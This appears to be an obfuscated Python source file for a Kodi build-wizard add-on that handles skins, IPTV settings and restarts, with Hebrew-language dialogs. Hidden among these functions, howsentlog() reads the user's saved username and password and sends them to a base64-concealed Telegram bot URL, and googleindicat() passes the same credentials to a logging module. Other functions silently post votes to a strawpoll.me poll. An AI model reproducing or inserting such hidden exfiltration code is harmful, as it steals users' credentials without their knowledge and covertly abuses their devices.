# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
IPTVSIMPL18 =uservar .IPTVSIMPL18 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
def MainMenu ():#line:256
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:258
def skinWIN ():#line:259
	idle ()#line:260
	OO0OOO0OOO0O0O00O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:261
	OO00O0OO00O000OO0 =[];O000O0O00O0000000 =[]#line:262
	for OO0000OO0O0000000 in sorted (OO0OOO0OOO0O0O00O ,key =lambda OO0000O0O0OO0O0OO :OO0000O0O0OO0O0OO ):#line:263
		O000O0O0OO00OO00O =os .path .split (OO0000OO0O0000000 [:-1 ])[1 ]#line:264
		O0OO000O000OO00O0 =os .path .join (OO0000OO0O0000000 ,'addon.xml')#line:265
		if os .path .exists (O0OO000O000OO00O0 ):#line:266
			O00OOO0OOOO0000O0 =open (O0OO000O000OO00O0 )#line:267
			OOOO00O000O00O00O =O00OOO0OOOO0000O0 .read ()#line:268
			OOO0000000O0O0OO0 =parseDOM2 (OOOO00O000O00O00O ,'addon',ret ='id')#line:269
			O0000O00OOO0O0O0O =O000O0O0OO00OO00O if len (OOO0000000O0O0OO0 )==0 else OOO0000000O0O0OO0 [0 ]#line:270
			try :#line:271
				O00O0OOOOOO0000OO =xbmcaddon .Addon (id =O0000O00OOO0O0O0O )#line:272
				OO00O0OO00O000OO0 .append (O00O0OOOOOO0000OO .getAddonInfo ('name'))#line:273
				O000O0O00O0000000 .append (O0000O00OOO0O0O0O )#line:274
			except :#line:275
				pass #line:276
	O0OOO0OO00OOOOOOO =[];O000O0OO0O00O0O0O =0 #line:277
	OO00O00000O0000OO =["Current Skin -- %s"%currSkin ()]+OO00O0OO00O000OO0 #line:278
	O000O0OO0O00O0O0O =DIALOG .select ("Select the Skin you want to swap with.",OO00O00000O0000OO )#line:279
	if O000O0OO0O00O0O0O ==-1 :return #line:280
	else :#line:281
		O000O0000000OO000 =(O000O0OO0O00O0O0O -1 )#line:282
		O0OOO0OO00OOOOOOO .append (O000O0000000OO000 )#line:283
		OO00O00000O0000OO [O000O0OO0O00O0O0O ]="%s"%(OO00O0OO00O000OO0 [O000O0000000OO000 ])#line:284
	if O0OOO0OO00OOOOOOO ==None :return #line:285
	for O000O0O0O0OOO000O in O0OOO0OO00OOOOOOO :#line:286
		swapSkins (O000O0O00O0000000 [O000O0O0O0OOO000O ])#line:287
def currSkin ():#line:289
	return xbmc .getSkinDir ('Container.PluginName')#line:290
def swapSkins (O0O000000OO0OO0OO ,title ="Error"):#line:291
	O0000OOO0O0O0O000 ='lookandfeel.skin'#line:292
	O0OOO0O0000OO0OO0 =O0O000000OO0OO0OO #line:293
	OO0O0O0OOOO000O00 =getOld (O0000OOO0O0O0O000 )#line:294
	O0OOO0O00O00O00OO =O0000OOO0O0O0O000 #line:295
	setNew (O0OOO0O00O00O00OO ,O0OOO0O0000OO0OO0 )#line:296
	OOO00O000O0O00000 =0 #line:297
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO00O000O0O00000 <100 :#line:298
		OOO00O000O0O00000 +=1 #line:299
		xbmc .sleep (1 )#line:300
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:301
		xbmc .executebuiltin ('SendClick(11)')#line:302
	return True #line:303
def getOld (O000O0O0O000O00O0 ):#line:305
	try :#line:306
		O000O0O0O000O00O0 ='"%s"'%O000O0O0O000O00O0 #line:307
		O000OOOOO000OO0O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O000O0O0O000O00O0 )#line:308
		OO0OOO000O00OOO0O =xbmc .executeJSONRPC (O000OOOOO000OO0O0 )#line:310
		OO0OOO000O00OOO0O =simplejson .loads (OO0OOO000O00OOO0O )#line:311
		if OO0OOO000O00OOO0O .has_key ('result'):#line:312
			if OO0OOO000O00OOO0O ['result'].has_key ('value'):#line:313
				return OO0OOO000O00OOO0O ['result']['value']#line:314
	except :#line:315
		pass #line:316
	return None #line:317
def setNew (OOO00O0OO00O0OOO0 ,O00O00OOOO00OOO00 ):#line:320
	try :#line:321
		OOO00O0OO00O0OOO0 ='"%s"'%OOO00O0OO00O0OOO0 #line:322
		O00O00OOOO00OOO00 ='"%s"'%O00O00OOOO00OOO00 #line:323
		OO0OO00000OO0O000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO00O0OO00O0OOO0 ,O00O00OOOO00OOO00 )#line:324
		OO0OO00O00OOOOOOO =xbmc .executeJSONRPC (OO0OO00000OO0O000 )#line:326
	except :#line:327
		pass #line:328
	return None #line:329
def idle ():#line:330
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:331
def resetkodi ():#line:333
		if xbmc .getCondVisibility ('system.platform.windows'):#line:334
			OOO00OO0OOOOOOOO0 =xbmcgui .DialogProgress ()#line:335
			OOO00OO0OOOOOOOO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:338
			OOO00OO0OOOOOOOO0 .update (0 )#line:339
			for OOO00O0O0OOO0O000 in range (5 ,-1 ,-1 ):#line:340
				time .sleep (1 )#line:341
				OOO00OO0OOOOOOOO0 .update (int ((5 -OOO00O0O0OOO0O000 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OOO00O0O0OOO0O000 ),'')#line:342
				if OOO00OO0OOOOOOOO0 .iscanceled ():#line:343
					from resources .libs import win #line:344
					return None ,None #line:345
			from resources .libs import win #line:346
		else :#line:347
			OOO00OO0OOOOOOOO0 =xbmcgui .DialogProgress ()#line:348
			OOO00OO0OOOOOOOO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:351
			OOO00OO0OOOOOOOO0 .update (0 )#line:352
			for OOO00O0O0OOO0O000 in range (5 ,-1 ,-1 ):#line:353
				time .sleep (1 )#line:354
				OOO00OO0OOOOOOOO0 .update (int ((5 -OOO00O0O0OOO0O000 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOO00O0O0OOO0O000 ),'')#line:355
				if OOO00OO0OOOOOOOO0 .iscanceled ():#line:356
					os ._exit (1 )#line:357
					return None ,None #line:358
			os ._exit (1 )#line:359
def backtokodi ():#line:361
			wiz .kodi17Fix ()#line:362
			fix18update ()#line:363
			fix17update ()#line:364
def testcommand1 ():#line:366
    import requests #line:367
    O0O0OOOO00O0O00O0 ='18773068'#line:368
    O00000OO00O0000O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OOOO00O0O00O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:380
    OO0O00O0OO0O0000O ='145273320'#line:382
    OO000OO0OO00OO0O0 ='145272688'#line:383
    if ADDON .getSetting ("auto_rd")=='true':#line:384
        OO0OO0OOOO000OOO0 =OO0O00O0OO0O0000O #line:385
    else :#line:386
        OO0OO0OOOO000OOO0 =OO000OO0OO00OO0O0 #line:387
    OO0000O00O000OO00 ={'options':OO0OO0OOOO000OOO0 }#line:391
    OOOOOO00O00O0O0O0 =requests .post ('https://www.strawpoll.me/'+O0O0OOOO00O0O00O0 ,headers =O00000OO00O0000O0 ,data =OO0000O00O000OO00 )#line:393
def builde_Votes ():#line:394
   try :#line:395
        import requests #line:396
        O0O0O000O0O00O000 ='18773068'#line:397
        OOOO000O0OO00O000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0O000O0O00O000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:409
        OO000OO0O00O00O0O ='145273320'#line:411
        O0OO00OOOOOO0000O ={'options':OO000OO0O00O00O0O }#line:417
        OO0000OO0O0O00O0O =requests .post ('https://www.strawpoll.me/'+O0O0O000O0O00O000 ,headers =OOOO000O0OO00O000 ,data =O0OO00OOOOOO0000O )#line:419
   except :pass #line:420
def update_Votes ():#line:421
   try :#line:422
        import requests #line:423
        O0OO000O00000O0OO ='18773068'#line:424
        OOO0000OOO0OOO0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OO000O00000O0OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:436
        O00OOO00OO000O0O0 ='145273321'#line:438
        OOO00OO0O000OOO0O ={'options':O00OOO00OO000O0O0 }#line:444
        OOOOO000000OOO00O =requests .post ('https://www.strawpoll.me/'+O0OO000O00000O0OO ,headers =OOO0000OOO0OOO0OO ,data =OOO00OO0O000OOO0O )#line:446
   except :pass #line:447
def testcommand ():#line:451
    wiz .kodi17fix ()#line:452
def skin_homeselect ():#line:453
	try :#line:455
		O0OO0O000O000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:456
		O00O000OO0000O0O0 =open (O0OO0O000O000OO00 ,'r')#line:458
		OO0O00OOOO00OOO0O =O00O000OO0000O0O0 .read ()#line:459
		O00O000OO0000O0O0 .close ()#line:460
		OO00OOO0OOOOO0OOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:461
		OOO0O00O0O00OOO00 =re .compile (OO00OOO0OOOOO0OOO ).findall (OO0O00OOOO00OOO0O )[0 ]#line:462
		O00O000OO0000O0O0 =open (O0OO0O000O000OO00 ,'w')#line:463
		O00O000OO0000O0O0 .write (OO0O00OOOO00OOO0O .replace ('<setting id="HomeS" type="string%s/setting>'%OOO0O00O0O00OOO00 ,'<setting id="HomeS" type="string"></setting>'))#line:464
		O00O000OO0000O0O0 .close ()#line:465
	except :#line:466
		pass #line:467
def autotrakt ():#line:470
    OO00OO000OOOO0O00 =(ADDON .getSetting ("auto_trk"))#line:471
    if OO00OO000OOOO0O00 =='true':#line:472
       from resources .libs import trk_aut #line:473
def traktsync ():#line:475
     O0OOO00O0OOO000O0 =(ADDON .getSetting ("auto_trk"))#line:476
     if O0OOO00O0OOO000O0 =='true':#line:477
       from resources .libs import trk_aut #line:480
     else :#line:481
        ADDON .openSettings ()#line:482
def imdb_synck ():#line:484
   try :#line:485
     OO0O0OOO0000OO0O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:486
     O00O000OOO00O00O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:487
     OO00OO00OOO0O0O0O =(ADDON .getSetting ("imdb_sync"))#line:488
     OO00O0O00000O0OO0 ="imdb.user"#line:489
     OOO00000OOOOOO00O ="accounts.informants.imdb.user"#line:490
     OO0O0OOO0000OO0O0 .setSetting (OO00O0O00000O0OO0 ,str (OO00OO00OOO0O0O0O ))#line:491
     O00O000OOO00O00O0 .setSetting ('accounts.informants.imdb.enabled','true')#line:492
     O00O000OOO00O00O0 .setSetting (OOO00000OOOOOO00O ,str (OO00OO00OOO0O0O0O ))#line:493
   except :pass #line:494
def dis_or_enable_addon (OO0O000O00O0OO0O0 ,OOO00000OOOOOOOOO ,enable ="true"):#line:496
    import json #line:497
    OOO0O0000OO0OOO00 ='"%s"'%OO0O000O00O0OO0O0 #line:498
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O000O00O0OO0O0 )and enable =="true":#line:499
        logging .warning ('already Enabled')#line:500
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O000O00O0OO0O0 )#line:501
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O000O00O0OO0O0 )and enable =="false":#line:502
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O000O00O0OO0O0 )#line:503
    else :#line:504
        O00OO0O0O00OO0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO0O0000OO0OOO00 ,enable )#line:505
        OOOOOOOO000000OOO =xbmc .executeJSONRPC (O00OO0O0O00OO0O0O )#line:506
        OO0000O0O0OOO00O0 =json .loads (OOOOOOOO000000OOO )#line:507
        if enable =="true":#line:508
            xbmc .log ("### Enabled %s, response = %s"%(OO0O000O00O0OO0O0 ,OO0000O0O0OOO00O0 ))#line:509
        else :#line:510
            xbmc .log ("### Disabled %s, response = %s"%(OO0O000O00O0OO0O0 ,OO0000O0O0OOO00O0 ))#line:511
    if OOO00000OOOOOOOOO =='auto':#line:512
     return True #line:513
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:514
def iptvset ():#line:517
  try :#line:518
    O0000000O000O0O00 =(ADDON .getSetting ("iptv_on"))#line:519
    if O0000000O000O0O00 =='true':#line:521
       if KODIV >=17 and KODIV <18 :#line:523
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:524
         O00000O0OOO0OOO00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:525
         O0O00000OO000OO0O =(ADDON .getSetting ("iptvUrl"))#line:527
         O00000O0OOO0OOO00 .setSetting ('m3uUrl',O0O00000OO000OO0O )#line:528
         OO0000O0O0OO0000O =(ADDON .getSetting ("epg_Url"))#line:529
         O00000O0OOO0OOO00 .setSetting ('epgUrl',OO0000O0O0OO0000O )#line:530
       if KODIV >=18 :#line:533
         iptvsimpldown ()#line:534
         wiz .kodi17Fix ()#line:535
         xbmc .sleep (1000 )#line:536
         O00000O0OOO0OOO00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:537
         O0O00000OO000OO0O =(ADDON .getSetting ("iptvUrl"))#line:538
         O00000O0OOO0OOO00 .setSetting ('m3uUrl',O0O00000OO000OO0O )#line:539
         OO0000O0O0OO0000O =(ADDON .getSetting ("epg_Url"))#line:540
         O00000O0OOO0OOO00 .setSetting ('epgUrl',OO0000O0O0OO0000O )#line:541
  except :pass #line:543
def howsentlog ():#line:550
       try :#line:551
          import json #line:552
          O00OO00O00O000OO0 =(ADDON .getSetting ("user"))#line:553
          O0OOOO0000OO0O00O =(ADDON .getSetting ("pass"))#line:554
          O0OOO0O000O0OOOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:555
          OO0O000OO000O0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:557
          O00OO0O0O0OO0O00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:558
          OO0O0O0O0OOO00O0O =str (json .loads (O00OO0O0O0OO0O00O )['ip'])#line:559
          OO00O0O00O0000O0O =O00OO00O00O000OO0 #line:560
          OO00OOOO000O0O0O0 =O0OOOO0000OO0O00O #line:561
          import socket #line:563
          O00OO0O0O0OO0O00O =urllib2 .urlopen (OO0O000OO000O0OO0 .decode ('base64')+' - '+OO00O0O00O0000O0O +' - '+OO00OOOO000O0O0O0 +' - '+O0OOO0O000O0OOOO0 ).readlines ()#line:564
       except :pass #line:565
def googleindicat ():#line:568
			import logg #line:569
			OOO0OOOOO00OOOO0O =(ADDON .getSetting ("pass"))#line:570
			O0OO0OO0O000000OO =(ADDON .getSetting ("user"))#line:571
			logg .logGA (OOO0OOOOO00OOOO0O ,O0OO0OO0O000000OO )#line:572
def logsend ():#line:573
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:574
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:575
      howsentlog ()#line:577
      import requests #line:578
      if xbmc .getCondVisibility ('system.platform.windows'):#line:579
         O00O0OOO00O0O0O00 =xbmc .translatePath ('special://home/kodi.log')#line:580
